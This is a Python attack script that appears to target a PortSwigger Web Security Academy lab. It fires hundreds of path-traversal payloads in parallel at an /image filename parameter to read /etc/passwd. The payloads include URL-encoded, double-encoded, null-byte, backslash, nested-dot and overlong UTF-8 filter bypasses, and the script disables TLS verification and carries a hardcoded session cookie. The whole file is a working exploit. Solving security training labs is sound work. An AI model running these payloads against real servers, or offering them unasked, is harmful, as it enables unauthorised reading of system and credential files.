#!/usr/bin/env python3
import requests
import urllib.parse
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

# Target URL and session
HOST = "0a4e001c03ab516b81460c3700ab00c2.web-security-academy.net"
SESSION = "a7asMKcp28qs8wJ6emFKWiYp9WMeajMk"

# Headers from the original request
headers = {
    "Host": HOST,
    "Cookie": f"session={SESSION}",
    "Sec-Ch-Ua-Platform": '"macOS"',
    "Accept-Language": "en-US,en;q=0.9",
    "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
    "Sec-Ch-Ua-Mobile": "?0",
    "Accept": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "no-cors",
    "Sec-Fetch-Dest": "image",
    "Referer": f"https://{HOST}/",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "i"
}

found_flag = threading.Event()

def test_payload(payload, description=""):
    """Test a specific payload and return the response"""
    if found_flag.is_set():
        return None
        
    url = f"https://{HOST}/image"
    params = {"filename": payload}
    
    try:
        response = requests.get(url, params=params, headers=headers, verify=False, timeout=10)
        
        # Check if we found /etc/passwd content
        if b"root:" in response.content or b"/bin/bash" in response.content:
            found_flag.set()
            print(f"\n✓ SUCCESS! [{description}]")
            print(f"Payload: {payload}")
            print(f"URL: {response.url}")
            print(f"Status: {response.status_code}")
            print(f"Response preview: {response.content[:500].decode('utf-8', errors='ignore')}")
            return {"success": True, "payload": payload, "description": description, "response": response}
        else:
            return {"success": False, "payload": payload, "status": response.status_code, "length": len(response.content)}
        
    except Exception as e:
        return {"success": False, "payload": payload, "error": str(e)}

def generate_payloads():
    """Generate all payload variations to test"""
    payloads = []
    
    # Test different depths (1 to 15 levels up)
    for depth in range(1, 16):
        traversal = "../" * depth
        
        # Basic variations
        payloads.extend([
            (f"{traversal}etc/passwd", f"Basic traversal depth {depth}"),
            (f"{traversal}/etc/passwd", f"Absolute path depth {depth}"),
            (f"{traversal}//etc/passwd", f"Double slash depth {depth}"),
            (f"{traversal}./etc/passwd", f"Current dir depth {depth}"),
        ])
        
        # Encoding variations
        encoded_traversal = urllib.parse.quote(traversal)
        double_encoded = urllib.parse.quote(encoded_traversal)
        mixed = traversal.replace("../", "%2e%2e/")
        mixed2 = traversal.replace("../", "%2e%2e%2f")
        mixed3 = traversal.replace("../", "..%2f")
        mixed4 = traversal.replace("../", "%2e%2e%5c")
        
        payloads.extend([
            (f"{encoded_traversal}etc/passwd", f"URL encoded depth {depth}"),
            (f"{double_encoded}etc/passwd", f"Double URL encoded depth {depth}"),
            (f"{mixed}etc/passwd", f"Mixed encoding v1 depth {depth}"),
            (f"{mixed2}etc/passwd", f"Mixed encoding v2 depth {depth}"),
            (f"{mixed3}etc/passwd", f"Mixed encoding v3 depth {depth}"),
            (f"{mixed4}etc/passwd", f"Mixed encoding v4 depth {depth}"),
        ])
        
        # Filter bypass variations
        payloads.extend([
            (f"{traversal}etc/passwd%00", f"Null byte depth {depth}"),
            (f"{traversal}etc/passwd%00.jpg", f"Null byte with extension depth {depth}"),
            (f"{traversal}etc/passwd?.jpg", f"Query string depth {depth}"),
            (f"{traversal}etc/passwd#.jpg", f"Fragment depth {depth}"),
        ])
        
        # Backslash variations
        backslash = traversal.replace("/", "\\")
        mixed_slash = traversal.replace("../", "..\\")
        
        payloads.extend([
            (f"{backslash}etc\\passwd", f"Backslash depth {depth}"),
            (f"{mixed_slash}etc/passwd", f"Mixed slash depth {depth}"),
        ])
        
        # Doubled/nested variations
        payloads.extend([
            (traversal.replace("../", "....//") + "etc/passwd", f"Doubled dots depth {depth}"),
            (traversal.replace("../", "..././") + "etc/passwd", f"Nested traversal depth {depth}"),
            (traversal.replace("../", "..//../") + "etc/passwd", f"Double nested depth {depth}"),
            (traversal.replace("../", "..;/") + "etc/passwd", f"Semicolon depth {depth}"),
        ])
        
        # Without leading slash
        payloads.extend([
            (f"{traversal}etc../etc/passwd", f"Bypass with etc.. depth {depth}"),
            (f"{traversal}etc%2f..%2fetc/passwd", f"Encoded bypass depth {depth}"),
        ])
        
    # Additional specific payloads
    additional_payloads = [
        ("/etc/passwd", "Direct absolute path"),
        ("etc/passwd", "Direct relative path"),
        ("//etc/passwd", "Double slash absolute"),
        ("///etc/passwd", "Triple slash absolute"),
        ("/./etc/passwd", "Current dir absolute"),
        ("/.//etc/passwd", "Current dir double slash"),
        ("%2fetc%2fpasswd", "Fully encoded absolute"),
        ("%252fetc%252fpasswd", "Double encoded absolute"),
        ("..%252f..%252f..%252fetc%252fpasswd", "Double encoded traversal"),
        ("..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "Overlong UTF-8"),
        ("..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd", "Unicode normalization"),
    ]
    
    for payload, desc in additional_payloads:
        payloads.append((payload, desc))
    
    return payloads

def main():
    print("Path Traversal Bypass Testing Script (Parallel)")
    print("===============================================")
    print(f"Testing {len(generate_payloads())} payloads in parallel...")
    print()
    
    # Disable SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    payloads = generate_payloads()
    start_time = time.time()
    
    # Use ThreadPoolExecutor for parallel testing
    with ThreadPoolExecutor(max_workers=20) as executor:
        # Submit all tasks
        future_to_payload = {executor.submit(test_payload, payload, desc): (payload, desc) 
                           for payload, desc in payloads}
        
        completed = 0
        failed = 0
        
        # Process results as they complete
        for future in as_completed(future_to_payload):
            if found_flag.is_set():
                executor.shutdown(wait=False)
                break
                
            result = future.result()
            if result:
                completed += 1
                if not result.get("success"):
                    failed += 1
                    if completed % 50 == 0:  # Progress update every 50 requests
                        print(f"Progress: {completed}/{len(payloads)} tested, {failed} failed", end='\r')
    
    elapsed = time.time() - start_time
    print(f"\n\nTesting completed in {elapsed:.1f} seconds")
    
    if found_flag.is_set():
        print("\nPath traversal vulnerability successfully exploited!")
    else:
        print("\nNo successful bypass found. The application might not be vulnerable or uses different filtering.")

if __name__ == "__main__":
    main()